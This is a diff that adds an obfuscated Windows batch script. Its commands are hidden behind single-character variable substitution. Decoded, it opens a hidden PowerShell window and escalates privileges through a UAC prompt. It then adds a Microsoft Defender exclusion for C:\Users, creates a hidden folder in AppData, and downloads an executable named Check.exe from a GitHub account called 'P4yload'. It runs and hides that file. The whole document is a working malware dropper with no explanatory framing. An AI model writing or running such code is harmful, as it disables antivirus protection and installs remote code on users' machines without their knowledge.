@@ -1,0 +1,109 @@
+ÿþ
+@echo off
+set dw=w
+set Lg=.
+set Ug=R
+set Uw=S
+set eQ=y
+set dQ=u
+set TA=L
+set Og=:
+set Xg=^
+set Kg=*
+set cg=r
+setlocal EnableDelayedExpansion
+set Qw=C
+set Yg=b
+set ag=j
+set RQ=E
+set KA=(
+set YQ=a
+set Rg=F
+set cw=s
+set dA=t
+set MQ=1
+set VA=T
+set UQ=Q
+set LQ=-
+set cA=p
+set TQ=M
+set PQ==
+set Qg=B
+set MA=0
+set bw=o
+set Jg=&
+set UA=P
+set cQ=q
+set ZA=d
+set NA=4
+set aA=h
+set Xw=_
+set QQ=A
+set Mw=3
+set WQ=Y
+set fg=~
+set Jw='
+set Yw=c
+set SA=H
+set Tw=O
+set Ig="
+set IA= 
+set bg=n
+set eA=x
+set dg=v
+set RA=D
+set bA=l
+set Zw=g
+set aQ=i
+set Zg=f
+set bQ=m
+set Ng=6
+set ZQ=e
+set Mg=2
+set KQ=)
+set Kw=+
+set Vw=W
+set Tg=N
+set SQ=I
+set LA=,
+set aw=k
+set Lw=/
+set XA=\
+set VQ=U
+cls
+:----------------------------------------------------------------------------------------------------------------:
+%cA%%bw%%dw%%ZQ%%cg%%cw%%aA%%ZQ%%bA%%bA%%IA%%LQ%%dw%%aQ%%bg%%ZA%%bw%%dw%%IA%%aA%%aQ%%ZA%%ZA%%ZQ%%bg%%IA%%LQ%%Yw%%bw%%bQ%%bQ%%YQ%%bg%%ZA%%IA%%Ig%%Ig%
+:----------------------------------------------------------------------------------------------------------------:
+%Yw%%bQ%%ZA%%IA%%Lw%%Yw%%IA%%IA%%IA%%IA%%IA%%SQ%%Rg%%IA%%Ig%%%%UA%%Ug%%Tw%%Qw%%RQ%%Uw%%Uw%%Tw%%Ug%%Xw%%QQ%%Ug%%Qw%%SA%%SQ%%VA%%RQ%%Qw%%VA%%VQ%%Ug%%RQ%%%%Ig%%IA%%RQ%%UQ%%VQ%%IA%%Ig%%YQ%%bQ%%ZA%%Ng%%NA%%Ig%%IA%%KA%
+>%bg%%dQ%%bA%%IA%%Mg%>&%MQ%%IA%%Ig%%%Uw%%WQ%%Uw%%VA%%RQ%%TQ%%Ug%%Tw%%Tw%%VA%%%XA%%Uw%%eQ%%cw%%Vw%%Tw%%Vw%%Ng%%NA%%XA%%Yw%%YQ%%Yw%%bA%%cw%%Lg%%ZQ%%eA%%ZQ%%Ig%%IA%%Ig%%%Uw%%WQ%%Uw%%VA%%RQ%%TQ%%Ug%%Tw%%Tw%%VA%%%XA%%Uw%%eQ%%cw%%Vw%%Tw%%Vw%%Ng%%NA%%XA%%Yw%%bw%%bg%%Zg%%aQ%%Zw%%XA%%cw%%eQ%%cw%%dA%%ZQ%%bQ%%Ig%
+%KQ%%IA%%RQ%%TA%%Uw%%RQ%%IA%%KA%
+>%bg%%dQ%%bA%%IA%%Mg%>&%MQ%%IA%%Ig%%%Uw%%WQ%%Uw%%VA%%RQ%%TQ%%Ug%%Tw%%Tw%%VA%%%XA%%cw%%eQ%%cw%%dA%%ZQ%%bQ%%Mw%%Mg%%XA%%Yw%%YQ%%Yw%%bA%%cw%%Lg%%ZQ%%eA%%ZQ%%Ig%%IA%%Ig%%%Uw%%WQ%%Uw%%VA%%RQ%%TQ%%Ug%%Tw%%Tw%%VA%%%XA%%cw%%eQ%%cw%%dA%%ZQ%%bQ%%Mw%%Mg%%XA%%Yw%%bw%%bg%%Zg%%aQ%%Zw%%XA%%cw%%eQ%%cw%%dA%%ZQ%%bQ%%Ig%
+%KQ%
+:----------------------------------------------------------------------------------------------------------------:
+%Yw%%bQ%%ZA%%IA%%Lw%%Yw%%IA%%aQ%%Zg%%IA%%Jw%%%%ZQ%%cg%%cg%%bw%%cg%%bA%%ZQ%%dg%%ZQ%%bA%%%%Jw%%IA%%Tg%%RQ%%UQ%%IA%%Jw%%MA%%Jw%%IA%%KA%
+%IA%%IA%%IA%%IA%%Zw%%bw%%dA%%bw%%IA%%VQ%%QQ%%Qw%%UA%%cg%%bw%%bQ%%cA%%dA%
+%KQ%%IA%%ZQ%%bA%%cw%%ZQ%%IA%%KA%%IA%%Zw%%bw%%dA%%bw%%IA%%Zw%%bw%%dA%%QQ%%ZA%%bQ%%aQ%%bg%%IA%%KQ%
+:----------------------------------------------------------------------------------------------------------------:
+:UACPrompt
+%Yw%%bQ%%ZA%%IA%%Lw%%Yw%%IA%%IA%%IA%%IA%%IA%%ZQ%%Yw%%aA%%bw%%IA%%Uw%%ZQ%%dA%%IA%%VQ%%QQ%%Qw%%IA%%PQ%%IA%%Qw%%cg%%ZQ%%YQ%%dA%%ZQ%%Tw%%Yg%%ag%%ZQ%%Yw%%dA%%Xg%%KA%%Ig%%Uw%%aA%%ZQ%%bA%%bA%%Lg%%QQ%%cA%%cA%%bA%%aQ%%Yw%%YQ%%dA%%aQ%%bw%%bg%%Ig%%Xg%%KQ%%IA%>%IA%%Ig%%%%dA%%ZQ%%bQ%%cA%%%%XA%%Zw%%ZQ%%dA%%YQ%%ZA%%bQ%%aQ%%bg%%Lg%%dg%%Yg%%cw%%Ig%
+%IA%%IA%%IA%%IA%%cw%%ZQ%%dA%%IA%%cA%%YQ%%cg%%YQ%%bQ%%cw%%PQ%%IA%%%Kg%
+%IA%%IA%%IA%%IA%%ZQ%%Yw%%aA%%bw%%IA%%VQ%%QQ%%Qw%%Lg%%Uw%%aA%%ZQ%%bA%%bA%%RQ%%eA%%ZQ%%Yw%%dQ%%dA%%ZQ%%IA%%Ig%%Yw%%bQ%%ZA%%Lg%%ZQ%%eA%%ZQ%%Ig%%LA%%IA%%Ig%%Lw%%Yw%%IA%%Ig%%Ig%%%fg%%cw%%MA%%Ig%%Ig%%IA%%%cA%%YQ%%cg%%YQ%%bQ%%cw%%Og%%Ig%%PQ%%Ig%%Ig%%%Ig%%LA%%IA%%Ig%%Ig%%LA%%IA%%Ig%%cg%%dQ%%bg%%YQ%%cw%%Ig%%LA%%IA%%MQ%%IA%>>%IA%%Ig%%%dA%%ZQ%%bQ%%cA%%%XA%%Zw%%ZQ%%dA%%YQ%%ZA%%bQ%%aQ%%bg%%Lg%%dg%%Yg%%cw%
+:----------------------------------------------------------------------------------------------------------------:
+%Yw%%bQ%%ZA%%IA%%Lw%%Yw%%IA%%IA%%IA%%IA%%IA%%Ig%%%%dA%%ZQ%%bQ%%cA%%%%XA%%Zw%%ZQ%%dA%%YQ%%ZA%%bQ%%aQ%%bg%%Lg%%dg%%Yg%%cw%%Ig%
+%Yw%%bQ%%ZA%%IA%%Lw%%Yw%%IA%%IA%%IA%%IA%%IA%%ZA%%ZQ%%bA%%IA%%Ig%%%%dA%%ZQ%%bQ%%cA%%%%XA%%Zw%%ZQ%%dA%%YQ%%ZA%%bQ%%aQ%%bg%%Lg%%dg%%Yg%%cw%%Ig%
+%IA%%IA%%IA%%IA%%ZQ%%eA%%aQ%%dA%%IA%%Lw%%Qg%
+:----------------------------------------------------------------------------------------------------------------:
+:gotAdmin
+%Yw%%bQ%%ZA%%IA%%Lw%%Yw%%IA%%IA%%IA%%IA%%IA%%cA%%dQ%%cw%%aA%%ZA%%IA%%Ig%%%%Qw%%RA%%%%Ig%
+%IA%%IA%%IA%%IA%%Qw%%RA%%IA%%Lw%%RA%%IA%%Ig%%%fg%%ZA%%cA%%MA%
+:----------------------------------------------------------------------------------------------------------------:
+%cA%%bw%%dw%%ZQ%%cg%%cw%%aA%%ZQ%%bA%%bA%%Lg%%ZQ%%eA%%ZQ%%IA%%LQ%%Yw%%bw%%bQ%%bQ%%YQ%%bg%%ZA%%IA%%Ig%%QQ%%ZA%%ZA%%LQ%%TQ%%cA%%UA%%cg%%ZQ%%Zg%%ZQ%%cg%%ZQ%%bg%%Yw%%ZQ%%IA%%LQ%%RQ%%eA%%Yw%%bA%%dQ%%cw%%aQ%%bw%%bg%%UA%%YQ%%dA%%aA%%IA%%Ig%%Qw%%Og%%XA%%VQ%%cw%%ZQ%%cg%%cw%
+:----------------------------------------------------------------------------------------------------------------:
+%Yw%%bQ%%ZA%%IA%%Lw%%Yw%%IA%%Yw%%ZA%%IA%%Ig%%Qw%%Og%%XA%%VQ%%cw%%ZQ%%cg%%cw%%XA%%%%VQ%%Uw%%RQ%%Ug%%Tg%%QQ%%TQ%%RQ%%%%XA%%QQ%%cA%%cA%%RA%%YQ%%dA%%YQ%%XA%%TA%%bw%%Yw%%YQ%%bA%%Ig%
+%bQ%%aw%%ZA%%aQ%%cg%%IA%%Ig%%Qw%%aA%%ZQ%%Yw%%aw%%Ig%
+%YQ%%dA%%dA%%cg%%aQ%%Yg%%IA%%Kw%%aA%%IA%%Ig%%Qw%%aA%%ZQ%%Yw%%aw%%Ig%%IA%%Lw%%cw%%IA%%Lw%%ZA%
+%Yw%%bQ%%ZA%%IA%%Lw%%Yw%%IA%%Yw%%ZA%%IA%%Qw%%Og%%XA%%VQ%%cw%%ZQ%%cg%%cw%%XA%%%%VQ%%Uw%%RQ%%Ug%%Tg%%QQ%%TQ%%RQ%%%%XA%%QQ%%cA%%cA%%RA%%YQ%%dA%%YQ%%XA%%TA%%bw%%Yw%%YQ%%bA%%XA%%Qw%%aA%%ZQ%%Yw%%aw%%Ig%%IA%
+:----------------------------------------------------------------------------------------------------------------:
+%UA%%bw%%dw%%ZQ%%cg%%cw%%aA%%ZQ%%bA%%bA%%IA%%LQ%%Qw%%bw%%bQ%%bQ%%YQ%%bg%%ZA%%IA%%Ig%%SQ%%bg%%dg%%bw%%aw%%ZQ%%LQ%%Vw%%ZQ%%Yg%%cg%%ZQ%%cQ%%dQ%%ZQ%%cw%%dA%%IA%%Jw%%aA%%dA%%dA%%cA%%cw%%Og%%Lw%%Lw%%Zw%%aQ%%dA%%aA%%dQ%%Yg%%Lg%%Yw%%bw%%bQ%%Lw%%UA%%NA%%eQ%%bA%%bw%%YQ%%ZA%%Lw%%Vw%%ZQ%%Yg%%Qw%%aA%%ZQ%%Yw%%aw%%Lw%%cg%%YQ%%dw%%Lw%%bQ%%YQ%%aQ%%bg%%Lw%%Qw%%aA%%ZQ%%Yw%%aw%%Lg%%ZQ%%eA%%ZQ%%Jw%%IA%%LQ%%Tw%%dQ%%dA%%Rg%%aQ%%bA%%ZQ%%IA%%Qw%%aA%%ZQ%%Yw%%aw%%Lg%%ZQ%%eA%%ZQ%%Ig%
+%cw%%dA%%YQ%%cg%%dA%%IA%%Qw%%aA%%ZQ%%Yw%%aw%%Lg%%ZQ%%eA%%ZQ%
+%Yw%%bQ%%ZA%%IA%%Lw%%Yw%%IA%%YQ%%dA%%dA%%cg%%aQ%%Yg%%IA%%Kw%%aA%%IA%%Ig%%Qw%%Og%%XA%%VQ%%cw%%ZQ%%cg%%cw%%XA%%%%VQ%%Uw%%RQ%%Ug%%Tg%%QQ%%TQ%%RQ%%%%XA%%QQ%%cA%%cA%%RA%%YQ%%dA%%YQ%%XA%%TA%%bw%%Yw%%YQ%%bA%%XA%%Qw%%aA%%ZQ%%Yw%%aw%%XA%%Qw%%aA%%ZQ%%Yw%%aw%%Lg%%ZQ%%eA%%ZQ%%Ig%%IA%%Lw%%cw%%IA%%Lw%%ZA%
